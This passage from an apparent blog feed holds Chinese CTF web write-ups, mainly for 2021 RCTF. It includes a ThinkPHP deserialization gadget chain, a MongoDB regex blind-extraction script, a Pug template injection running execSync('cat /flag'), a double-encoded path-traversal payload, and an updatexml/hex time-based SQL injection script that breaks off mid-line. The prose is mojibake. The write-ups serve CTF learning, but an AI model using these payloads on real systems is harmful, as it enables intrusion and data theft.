];</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handler;</span><br><span class="line">        <span class="keyword">protected</span> $tag = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">protected</span> $options = [<span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;gml/&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> Request();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Output</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>();</span><br><span class="line">    $model = <span class="keyword">new</span> think\db\Query($Output);</span><br><span class="line">    $HasOne = <span class="keyword">new</span> think\model\relation\HasOne($model);</span><br><span class="line">    $window = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot($Output, $HasOne));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($window));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 RCTF éƒ¨åˆ†Webé¢˜è§£</title>
      <link href="/2021/09/13/2021-RCTF/"/>
      <url>/2021/09/13/2021-RCTF/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‘¨æœ«æœ¬æ¥æœ‰æŠ¥å‘Šddlï¼Œè¯´å¥½çš„ä¸æ‰“ï¼Œç»“æœè¿˜æ˜¯å¿ä¸ä½å»çœ‹äº†é¢˜ï¼ˆROISçš„Webæ¯å¹´è¯„ä»·éƒ½ä¸é”™ï¼‰â€¦ æ‰“äº†ä¸¤å¤©ï¼Œæ—¶é—´å¤§éƒ¨åˆ†æµªè´¹åœ¨äº†ä¸¤ä¸ªsqlé¢˜ç›®ä¸Šã€‚é˜Ÿé‡Œä¹Ÿæ²¡å•¥äººæ‰“ï¼Œä¸€å…±æ‰“æ¯”èµ›çš„å°±å››ä¸ªäººã€‚</p><a id="more"></a><h1 id="CandyShop"><a href="#CandyShop" class="headerlink" title="CandyShop"></a>CandyShop</h1><p>é¦–å…ˆæ˜¯Mongodb æ³¨å…¥ï¼Œå¯ä»¥æ³¨å…¥å‡ºå¯†ç ã€‚</p><p>åé¢pugæ¨¡ç‰ˆæ¸²æŸ“ï¼Œaddresså¤„å¯ä»¥æ‹¼æ¥ä»£ç ï¼Œä½†æ˜¯æ²¡æœ‰requireï¼Œæ„é€ æˆä¸‹é¢è¿™ç§ï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled.png" alt="Untitled"></p><p>æ³¨æ„è¦æœ‰ç¼©è¿›ï¼Œä¸ç„¶ä¼šæŠ¥é”™å¾ˆå‘ã€‚æˆ‘æœ¬åœ°èµ·äº†ä¸ªç¯å¢ƒï¼Œè°ƒè¯•äº†ä¸€ä¼šæ‰å¯ä»¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">password</span>):</span></span><br><span class="line">    paramsPostDict = &#123;<span class="string">&quot;password[\x24regex]&quot;</span>: password, <span class="string">&quot;username[\x24regex]&quot;</span>: <span class="string">&quot;rabbit&quot;</span>&#125;</span><br><span class="line">    paramsPost = <span class="string">&quot;&amp;&quot;</span>.join(</span><br><span class="line">        <span class="string">&quot;%s=%s&quot;</span> % (k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> paramsPostDict.items())  <span class="comment"># Manually concatenated to avoid some encoded characters</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://123.60.21.23:23333&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://123.60.21.23:23333/user/register&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://123.60.21.23:23333/user/login&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You Bad Bad&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789abcdef&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;^&quot;</span> + data + c</span><br><span class="line">            <span class="keyword">if</span> req(payload):</span><br><span class="line">                data += c</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span> data</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;fail!&quot;</span></span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    password = exp()</span><br><span class="line">    session.post(<span class="string">&quot;http://123.60.21.23:23333/user/login&quot;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: password&#125;)</span><br><span class="line">    resp = session.post(<span class="string">&quot;http://123.60.21.23:23333/shop/order&quot;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;candyname&#x27;</span>: <span class="string">&#x27;bunny_candy&#x27;</span>,</span><br><span class="line">                                                               <span class="string">&#x27;address&#x27;</span>: <span class="string">&quot;gml&#x27; readonly)\r\n                                \x23&#123;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString(\&quot;utf8\&quot;)&#125;\r\n                                //&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span> resp.content</span><br></pre></td></tr></table></figure><h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>éœ€è¦ç»•è¿‡nginxå¯¹ /adminçš„è¿‡æ»¤ï¼Œä»¥åŠè·¯å¾„ä¸­è¦åŒ…å« login çš„æ£€æŸ¥ã€‚</p><p>è¿™ä¸ªé¢˜æ¯”è¾ƒå‘ï¼Œæˆ‘æœ¬åœ°èµ·ç¯å¢ƒç›´æ¥æŠ¥é”™ï¼Œå¿…é¡»dockerèµ·ï¼Œæ‰€ä»¥æˆ‘å°±åœ¨æºç é‡Œç”¨ var_dump è°ƒè¯•ã€‚</p><p>è·Ÿflightè·¯ç”±æºç ï¼Œ<a href="https://segmentfault.com/a/1190000017289717?sort=newest">https://segmentfault.com/a/1190000017289717?sort=newest</a></p><p>æœ€ç»ˆç”¨æ­£åˆ™åŒ¹é…urlçš„æ—¶å€™åœ¨<code>net/Route.php</code>ï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913140407636.png" alt="image-20210913140407636"></p><p>patternæ˜¯/adminçš„æ—¶å€™ï¼Œè¿™ä¸ªæ­£åˆ™æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#^&#x2F;admin&#x2F;?(?:\\?.*)?$#i</span><br></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-RCTF/Untitled1.png" alt="Untitled 1"></p><p>å¹¶ä¸”é»˜è®¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥ä½¿ç”¨<code>/Admin%3flogin</code> å¯ä»¥ç»•è¿‡ã€‚</p><p>åé¢è¿˜éœ€è¦bypasså¯¹ ../ çš„è¿‡æ»¤ï¼Œçœ‹çœ‹è¿™ä¸ª$request-&gt;query æ€ä¹ˆå¾—åˆ°çš„ï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled2.png" alt="Untitled 2"></p><p>è¿™é‡Œå› ä¸ºå‰é¢%3fé—®å·ç»•è¿‡ï¼Œå¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œ%3fè§£ç æˆäº†é—®å·ï¼Œåé¢çš„å˜æˆäº†å‚æ•°ï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled3.png" alt="Untitled 3"></p><p>å¯ä»¥çœ‹åˆ°loginè¢«è¯†åˆ«æˆäº†ä¸€ä¸ªGETå‚æ•°ï¼Œæ‰€ä»¥åé¢å°±å¯ä»¥æ‹¼æ¥&amp;æ¥ä¼ å…¥dataæ¥bypass WAF å¯¹$_GETçš„è¿‡æ»¤äº†ã€‚</p><p>ä½†æ˜¯ <code>/ADMIN%3flogin=1&amp;data=..%2f</code> ä¸æˆåŠŸï¼Œå› ä¸º%2fè§£ç åå˜æˆäº†/ï¼Œä¸­é—´çš„åˆå˜æˆè·¯å¾„äº†ã€‚è¿™é‡Œç»§ç»­è·Ÿæºç ï¼Œå‘ç° self::parseQuery é‡Œæœ‰ parse_urlï¼Œparse_urlä¼šè¿›è¡Œä¸€æ¬¡urldecodeï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled4.png" alt="Untitled 4"></p><p>æ‰€ä»¥äºŒæ¬¡ç¼–ç å¯ä»¥ç»•è¿‡ã€‚</p><p>payloadï¼š<code>/ADMIN%3flogin=1&amp;data=..%252f..%252f..%252fflag</code></p><h1 id="EasySQLi"><a href="#EasySQLi" class="headerlink" title="EasySQLi"></a>EasySQLi</h1><p>è¿™ä¸ªé¢˜åšäº†å¥½ä¹…ï¼Œæœ€åè¿˜å¥½ç»ˆäºå‡ºäº†ï¼Œè¿›è¡Œäº†å¾ˆå¤šçš„å°è¯•ã€‚ä¸è¿‡è¿™é¢˜ç›®ä»åšä¸‹æ¥åˆ°èµ›åè·Ÿå‡ºé¢˜äººäº¤æµï¼Œå­¦åˆ°äº†ä¸å°‘ã€‚</p><p>é¢˜ç›®é€»è¾‘å¾ˆç®€å•ï¼Œuser()å°±æ˜¯flagï¼Œéœ€è¦æ³¨å…¥å‡ºuser()çš„æ•°æ®ã€‚é—®é¢˜åœ¨äº where çš„æ¡ä»¶æ˜¯å‡çš„ï¼Œå¯¼è‡´order by çš„è¯­å¥ä¸ä¼šæ‰§è¡Œï¼ˆå…¶å®whereæ¡ä»¶æ˜¯çœŸçš„ä¹Ÿä¸èƒ½sleepï¼Œå› ä¸ºåªæœ‰ä¸€è¡Œæ•°æ®ä¸éœ€è¦order byï¼‰</p><p><img src="/2021/09/13/2021-RCTF/image-20210913141425316.png" alt="image-20210913141425316"></p><h2 id="å¤±è´¥çš„å°è¯•"><a href="#å¤±è´¥çš„å°è¯•" class="headerlink" title="å¤±è´¥çš„å°è¯•"></a>å¤±è´¥çš„å°è¯•</h2><p>pdo é»˜è®¤æ˜¯å¯ä»¥å †å çš„ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜æ²¡ç»™é…ç½®ï¼Œå°±éå¸¸éš¾å—ã€‚å¼€å§‹çš„æƒ³æ³•æ˜¯order by åé¢çš„è¯­å¥æ ¹æœ¬å°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œä¸å †å ä¸èƒ½åšï¼Œæ‰€ä»¥æµ‹è¯•äº†å¥½ä¹…é¢˜ç›®èƒ½ä¸èƒ½å †å ã€‚</p><p>æœ¬åœ°æ­å»ºäº†ä¸€ä¸ªéå¸¸è¿‘ä¼¼çš„ç¯å¢ƒï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbms=<span class="string">&#x27;mysql&#x27;</span>;     </span><br><span class="line">$host=<span class="string">&#x27;127.0.0.1&#x27;</span>; </span><br><span class="line">$port = <span class="string">&#x27;2333&#x27;</span>;</span><br><span class="line">$dbName=<span class="string">&#x27;test&#x27;</span>;    </span><br><span class="line">$user=<span class="string">&#x27;root&#x27;</span>;      </span><br><span class="line">$pass=<span class="string">&#x27;123456&#x27;</span>;    </span><br><span class="line">$dsn=<span class="string">&quot;<span class="subst">$dbms</span>:host=<span class="subst">$host</span>;port=<span class="subst">$port</span>;dbname=<span class="subst">$dbName</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $dbh = <span class="keyword">new</span> PDO($dsn, $user, $pass); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è¿æ¥æˆåŠŸ&lt;br/&gt;\n&quot;</span>;</span><br><span class="line">    $dbh = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">die</span> (<span class="string">&quot;Error!: &quot;</span> . $e-&gt;getMessage() . <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$db = <span class="keyword">new</span> PDO($dsn, $user, $pass);</span><br><span class="line">set_time_limit(<span class="number">1</span>);</span><br><span class="line">$s = floatval(microtime());</span><br><span class="line"><span class="comment">// echo $s;</span></span><br><span class="line">$order = <span class="string">&#x27;1;select sleep(4)&#x27;</span>;</span><br><span class="line">$sql = <span class="string">&quot;SELECT CONCAT(&#x27;RCTF&#123;&#x27;,USER(),&#x27;&#125;&#x27;) AS FLAG WHERE &#x27;ğŸ¬å…³æ³¨å˜‰ç„¶ğŸ¬&#x27; = &#x27;ğŸ¬é¡¿é¡¿è§£é¦‹ğŸ¬&#x27; OR &#x27;ğŸ¬Watch Diana a dayğŸ¬&#x27; = &#x27;ğŸ¬Keep hunger awayğŸ¬&#x27; OR &#x27;ğŸ¬å˜‰ç„¶ã«æ³¨ç›®ã—ã¦ğŸ¬&#x27; = &#x27;ğŸ¬é£Ÿæ¬²ã‚’ããã‚‹ğŸ¬&#x27; ORDER BY <span class="subst">$order</span>;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> microtime().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$stm = $db-&gt;prepare($sql);</span><br><span class="line"><span class="keyword">echo</span> microtime().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$stm-&gt;execute();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Count <span class="subst">&#123;$stm-&gt;rowCount()&#125;</span>.&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">usleep((<span class="number">1</span> + floatval(microtime()) - $s) * <span class="number">1e6</span>);</span><br></pre></td></tr></table></figure><p>èµ·ä¸ª 8.0.21 çš„mysqlï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name sql  -e MYSQL_ROOT_PASSWORD=123456 -p 2333:3306 -d mysql:8.0.21</span><br></pre></td></tr></table></figure><p>é»˜è®¤pdoæ˜¯å¯ä»¥å †å çš„ï¼Œæ‰€ä»¥æœ¬åœ°è¿™ä¸ªç¯å¢ƒå †å æ²¡ä»€ä¹ˆé—®é¢˜ã€‚</p><p>è¿™ä¸ªé¢˜ä»£ç é‡Œæœ‰ä¸€äº›å¯¹æ—¶é—´çš„æ“ä½œï¼Œè¿™ä¸ª <code>set_time_limit(1);</code>åŠ ä¸Šæœ€åçš„ usleepï¼Œæˆ‘æœ¬æ¥ä»¥ä¸ºæ˜¯è®©è„šæœ¬è¿è¡Œæ—¶é—´æ’å®šä¸ºä¸€ç§’å·¦å³ï¼Œé˜²æ­¢æ—¶é—´ç›²æ³¨ã€‚ä½†æ˜¯æœ¬åœ°æµ‹è¯•å‘ç°ç›´æ¥orderè®¾ç½®æˆ <code>1;select sleep(4)</code>å°±å¯ä»¥sleep 4sã€‚google ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The set_time_limit() function and the configuration directive max_execution_time only affect the execution time of the script itself. Any time spent on activity that happens outside the execution of the script such as system calls using system(), stream operations, database queries, etc. is not included when determining the maximum time that the script has been running. This is not true on Windows where the measured time is real.</span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥mysqlæ“ä½œä¸å—è¿™ä¸ªå‡½æ•°çš„å½±å“ã€‚ä½†æ˜¯è¿œç¨‹å°±æ˜¯ä¸å»¶è¿Ÿï¼Œè¿™è®©æˆ‘å¯¹è¿œç¨‹æ˜¯å¦å¯ä»¥å †å äº§ç”Ÿäº†æ€€ç–‘ã€‚</p><p>æœ¬åœ°æµ‹è¯•è¿˜å‘ç°ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼Œå³ä½¿sleepï¼Œä½†æ˜¯è¿è¡Œphpè„šæœ¬ï¼Œé©¬ä¸Šå°± echo äº†è¡Œæ•°ã€‚æ‰€ä»¥ç¬¬äºŒæ¡è¯­å¥æ˜¯åœ¨åå°æ‰§è¡Œçš„ï¼Œè€Œä¸æ˜¯åœ¨æ‰§è¡Œé˜¶æ®µå¡ä½ã€‚ä»¥ä¸ºè¿™æ˜¯è€ƒç‚¹ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆåµç”¨ï¼ˆä¸èƒ½å †å ï¼‰ã€‚</p><p>ç»è¿‡äº†å¤§é‡çš„æœ¬åœ°æµ‹è¯•å’Œè¿œç¨‹å°è¯•ï¼Œå¯ä»¥åŸºæœ¬ç¡®å®šè¿œç¨‹ä¸èƒ½å †å æ³¨å…¥â€¦.</p><p>æ„Ÿè§‰ä¸æ˜¯æ—¶é—´ç›²æ³¨ï¼Œä½†æ˜¯é¢˜ç›®å¯¹æ—¶é—´çš„æ“ä½œç¡®å®å¥‡æ€ªï¼Œä¸€ç›´stuckï¼Œå°±å»çœ‹å¦ä¸€ä¸ªsqläº†ã€‚</p><p>ç›´åˆ°ç¬¬äºŒå¤©æ™šä¸Šæ”¾äº†hintï¼štime-basedã€‚ç»§ç»­ç¡¬ç€å¤´çš®çœ‹ï¼Œæƒ³åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆç”¨prepareå’Œexecuteè€Œä¸æ˜¯ç›´æ¥queryï¼Œè«é prepare çš„æ—¶å€™æœ‰å»¶è¿Ÿçš„æ–¹æ³•ï¼Ÿ</p><p>ç„¶åå°±æ˜¯å„ç§å°è¯•ï¼Œä½¿ç”¨mysql client ç»ˆç«¯çš„ prepare è¿›è¡Œæµ‹è¯•ï¼Œæµ‹è¯•å¾ˆå¤šå‘ç°åé¢è¿˜æ˜¯ä¸ä¼šæ‰§è¡Œâ€¦</p><h2 id="å‘ç°updatexml"><a href="#å‘ç°updatexml" class="headerlink" title="å‘ç°updatexml"></a>å‘ç°updatexml</h2><p>å¦ä¸€ä¸ª ns_shift_sql é¢˜ç›®æ˜¯è€ƒæŠ¥é”™çš„ï¼Œæˆ‘éšä¾¿åœ¨è¿™ä¸ªé¢˜ç›´æ¥æ‰”ä¸€ä¸ª updatexml æŠ¥é”™æ³¨å…¥çš„payloadï¼Œæ²¡æƒ³åˆ°å±…ç„¶åœ¨prepareé˜¶æ®µè¢«æ‰§è¡Œäº†ï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled6.png" alt="Untitled 6"></p><p>ç¬é—´ç‹‚å–œï¼Œæ„Ÿè§‰å¯ä»¥æï¼Œä½†æ˜¯ä¸èƒ½ç”¨ sleepã€‚è¦æƒ³åŠæ³•è®©mysqlå»åšä¸€äº›è´¹æ—¶çš„æ“ä½œé€ æˆå»¶è¿Ÿï¼Œæ‰€ä»¥å°è¯•ç”¨ä¸€å¤§å †hexï¼Œå› ä¸ºè¿™ä¸ªè®¡ç®—é‡æ˜¯æˆå€å¢åŠ ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare a from  &quot;select 1 where 0 order by updatexml(1,concat(&#39;~&#39;,(if(1,(select length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#39;11111111&#39;))))))))))))))))))))))))))))))))))))))))))))))))))),&#39;a&#39;),1)),1)&quot;;</span><br></pre></td></tr></table></figure><p> ç»“æœmysqlè¿™ä¸ªå®¹å™¨ç›´æ¥æŒ‚äº†ï¼Œè€Œifåé¢æ”¹æˆ0ï¼Œä¸ä¼šæŒ‚ã€‚çœ‹æ ·å­å¯ä»¥ç›²æ³¨äº†ã€‚</p><p>æˆ‘ç›´æ¥è¯•äº†ä¸€ä¸‹æ‰“è¿œç¨‹ï¼Œç»“æœè¿œç¨‹ç¯å¢ƒ mysql ç›´æ¥æŒ‚äº†ã€‚å‡å°‘ç‚¹hexï¼Œç»è¿‡æµ‹è¯•ï¼Œå¤§çº¦30ä¸ªhexï¼Œé‡Œé¢æ•°æ®æ˜¯ â€˜1â€™ï¼Œä¸ä¼šæŒ‚æ‰ï¼Œå¹¶ä¸”è¿œç¨‹ç¯å¢ƒèƒ½å»¶æ—¶3ç§’å¤šï¼Œéå¸¸ä¸é”™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">order</span>):</span></span><br><span class="line">    paramsGet = &#123;</span><br><span class="line">        <span class="string">&quot;order&quot;</span>: order&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;e5c4d349d498b38170023dc707e5f7fc&quot;</span>&#125;</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    response = session.get(<span class="string">&quot;http://124.71.132.232:11002/&quot;</span>, params=paramsGet, headers=headers)</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    <span class="keyword">if</span> t2 - t1 &gt; <span class="number">2.5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tem = <span 